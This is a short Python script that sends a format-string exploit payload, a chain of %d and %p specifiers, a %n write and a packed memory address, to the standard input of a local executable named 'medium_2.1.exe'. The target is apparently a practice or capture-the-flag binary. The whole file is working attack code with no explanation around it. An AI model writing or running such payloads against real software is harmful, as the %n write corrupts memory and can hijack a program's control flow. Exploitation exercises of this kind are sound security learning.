from subprocess import PIPE, Popen

payload = b"%d%d%d%p%p%nAAAA" + b"\x8c\xfe\x5f\x00\x00\x00\x00\x00"

p1 = Popen("medium\\medium_2.1.exe", stdin=PIPE)
p1.communicate(payload)
p1.wait()